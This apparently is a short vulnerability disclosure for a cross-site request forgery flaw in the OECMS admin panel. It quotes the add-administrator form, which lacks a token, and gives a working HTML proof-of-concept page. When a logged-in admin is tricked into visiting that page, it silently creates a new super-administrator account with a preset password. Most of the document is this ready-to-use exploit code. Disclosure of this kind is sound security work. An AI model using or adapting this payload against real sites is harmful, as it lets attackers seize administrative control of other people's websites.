
# The latest version of OECMS, CSRF backstage admin



In the field that adds administrator operation in the background, the form does not have a authentication or token authentication mechanism, so there is a Cross-Site Request Forgery (Add Admin) to add the administrator.

``` html
<form name="myform" id="myform" method="post" action="admincp.php?c=admin" onsubmit='return checkform();' />
    <input type="hidden" name="a" value="saveadd" />
	<table cellpadding='3' cellspacing='3' class='tab'>
	  <tr>
		<td class='hback_1' width="15%">登录帐号：<span class='f_red'>*</span></td>
		<td class='hback' width="85%"><input type="text" name="adminname" id="adminname" class="input-150" /> <span class='f_red' id="dadminname"></span> <font color="#999999">4-16个字符，只能由中文、字母、数字和下横线组成</font></td>
	  </tr>
	  <tr>
		<td class='hback_1'>登录密码：<span class='f_red'>*</span></td>
		<td class='hback'><input type="password" name="password" id="password" class="input-100" /> <span class='f_red' id="dpassword"></span> <font color="#999999">4-16个字符</font></td>
	  </tr>
 	  <tr>
		<td class='hback_1'>确认密码：<span class='f_red'>*</span></td>
		<td class='hback'><input type="password" name="confirmpassword" id="confirmpassword" class="input-100" /> <span class='f_red' id="dconfirmpassword"></span> <font color="#999999">4-16个字符</font></td>
	  </tr>
	  <tr>
		<td class='hback_1'>帐号设置：<span class='f_red'></span></td>
		<td class='hback'><input type="radio" name="flag" value="1" checked />正常，<input type="radio" name="flag" value="0" />锁定，<input type="checkbox" name="super" value="1" checked />系统管理员</td>
	  </tr>
	  <tr>
		<td class='hback_1'>备注说明： </td>
		<td class='hback'><textarea name='memo' id='memo' style='width:50%;height:85px;overflow:auto;color:#444444;'></textarea></td>
	  </tr>
	  <tr>
		<td class='hback_none'></td>
		<td class='hback_none'><input type="submit" name="btn_save" class="button" value="添加保存" /></td>
	  </tr>
	</table>
	</form>
```
Then, we can build the following POC,
``` html
<html>
  <body>
    <form action="http://127.0.0.1/cms/upload/admincp.php" method="POST">
      <input type="hidden" name="c" value="admin" />
      <input type="hidden" name="a" value="saveadd" />
      <input type="hidden" name="adminname" value="admin22" />
      <input type="hidden" name="password" value="admin666" />
      <input type="hidden" name="confirmpassword" value="admin666" />
      <input type="hidden" name="flag" value="1" />
      <input type="hidden" name="super" value="1" />
      <input type="hidden" name="memo" value="a" />
      <input type="hidden" name="btn&#95;save" value="æ&#183;&#187;å&#138;&#160;ä&#191;&#157;å&#173;&#152;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

Here's my own demonstration of the attack
![]()
